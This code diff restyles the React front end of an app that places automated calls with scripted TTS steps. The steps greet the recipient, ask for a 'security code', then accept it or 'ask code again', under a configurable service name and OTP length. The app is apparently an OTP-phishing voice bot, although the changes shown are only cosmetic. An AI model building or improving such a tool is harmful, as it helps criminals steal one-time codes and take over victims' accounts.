@@ -751,34 +751,34 @@ function App() {
                   type="text"
                   value={recipientNumber}
                   onChange={(e) => setRecipientNumber(e.target.value)}
-                  className="glass-input h-12 font-mono text-cyan-100"
+                  className="glass-input font-mono text-cyan-100"
                   placeholder="+525547000906"
                   data-testid="recipient-number-input"
                 />
               </div>
               
               <div>
-                <label className="form-label flex items-center gap-2">
-                  <Building className="w-3 h-3" />
+                <label className="form-label flex items-center gap-1">
+                  <Building className="w-2.5 h-2.5" />
                   Service Name
                 </label>
                 <Input
                   type="text"
                   value={serviceName}
                   onChange={(e) => setServiceName(e.target.value)}
-                  className="glass-input h-12 font-mono text-cyan-100"
+                  className="glass-input font-mono text-cyan-100"
                   placeholder="MyCompany"
                   data-testid="service-name-input"
                 />
               </div>
               
               <div>
-                <label className="form-label flex items-center gap-2">
-                  <Hash className="w-3 h-3" />
+                <label className="form-label flex items-center gap-1">
+                  <Hash className="w-2.5 h-2.5" />
                   OTP Digits
                 </label>
                 <Select value={otpDigits} onValueChange={setOtpDigits}>
-                  <SelectTrigger className="glass-input h-12 font-mono text-cyan-100" data-testid="otp-digits-select">
+                  <SelectTrigger className="glass-input font-mono text-cyan-100" data-testid="otp-digits-select">
                     <SelectValue />
                   </SelectTrigger>
                   <SelectContent className="bg-slate-900 border-slate-800">
@@ -786,7 +786,7 @@ function App() {
                       <SelectItem 
                         key={num} 
                         value={num.toString()}
-                        className="font-mono text-sm"
+                        className="font-mono text-xs"
                       >
                         {num}
                       </SelectItem>
@@ -798,54 +798,54 @@ function App() {
               <div className="flex items-end">
                 <Button 
                   variant="outline"
-                  className="w-full h-12 glass-input border-cyan-500/30 text-cyan-400 hover:bg-cyan-500/10 font-mono text-xs uppercase tracking-wider"
+                  className="w-full glass-input border-cyan-500/30 text-cyan-400 hover:bg-cyan-500/10 font-mono text-[10px] uppercase tracking-wider"
                   data-testid="preview-voice-btn"
                 >
-                  <Volume2 className="w-4 h-4 mr-2" />
-                  Preview Voice
+                  <Volume2 className="w-3 h-3 mr-1" />
+                  Preview
                 </Button>
               </div>
             </div>
           </div>
 
           {/* Call Steps Configuration */}
-          <div className="form-section glass-panel p-6 rounded-xl mb-6" data-testid="call-steps-section">
+          <div className="form-section glass-panel p-3 rounded-lg mb-3" data-testid="call-steps-section">
             <h3 className="section-title">
-              <Layers className="w-5 h-5" />
-              Call Steps Configuration
+              <Layers className="w-4 h-4" />
+              Call Steps
             </h3>
             
             <Tabs value={activeStep} onValueChange={setActiveStep} className="w-full">
-              <TabsList className="w-full bg-black/40 border border-white/5 p-1 rounded-lg" data-testid="call-steps-tabs">
+              <TabsList className="w-full bg-black/40 border border-white/5 p-0.5 rounded-md h-7" data-testid="call-steps-tabs">
                 {["step1", "step2", "step3", "accepted", "rejected"].map((step) => (
                   <TabsTrigger
                     key={step}
                     value={step}
-                    className={`flex-1 font-mono text-xs uppercase tracking-wider border border-transparent
+                    className={`flex-1 font-mono text-[10px] uppercase tracking-wider border border-transparent h-6
                       data-[state=active]:bg-cyan-500/10 data-[state=active]:text-cyan-400 data-[state=active]:border-cyan-500/30
-                      ${currentStep === step ? 'ring-2 ring-emerald-500/50' : ''}`}
+                      ${currentStep === step ? 'ring-1 ring-emerald-500/50' : ''}`}
                     data-testid={`step-tab-${step}`}
                   >
-                    {step === "accepted" ? "Accept" : step === "rejected" ? "Retry" : `Step ${step.slice(-1)}`}
+                    {step === "accepted" ? "Accept" : step === "rejected" ? "Retry" : `S${step.slice(-1)}`}
                   </TabsTrigger>
                 ))}
               </TabsList>
               
               {["step1", "step2", "step3", "accepted", "rejected"].map((step) => (
-                <TabsContent key={step} value={step} className="mt-4">
-                  <label className="form-label">
-                    {step === "step1" && "Step 1 - Greetings (Wait for DTMF: 0 or 1)"}
-                    {step === "step2" && "Step 2 - Prompt (Wait for Security Code)"}
-                    {step === "step3" && "Step 3 - Verification Wait Message"}
-                    {step === "accepted" && "Accept - End Message (Call Ends)"}
-                    {step === "rejected" && "Retry - Rejected Message (Ask Code Again)"}
+                <TabsContent key={step} value={step} className="mt-2">
+                  <label className="form-label text-[9px]">
+                    {step === "step1" && "Step 1 - Greetings (DTMF: 0/1)"}
+                    {step === "step2" && "Step 2 - Ask Security Code"}
+                    {step === "step3" && "Step 3 - Wait Message"}
+                    {step === "accepted" && "Accept - End Message"}
+                    {step === "rejected" && "Retry - Ask Code Again"}
                   </label>
                   <Textarea
                     value={stepMessages[step]}
                     onChange={(e) => setStepMessages({ ...stepMessages, [step]: e.target.value })}
                     className="glass-input form-textarea font-mono text-cyan-100"
-                    placeholder={`Enter TTS message for ${step}...`}
-                    rows={4}
+                    placeholder={`TTS message for ${step}...`}
+                    rows={2}
                     data-testid={`step-message-${step}`}
                   />
                   <div className="mt-2 text-xs text-slate-500 font-mono">
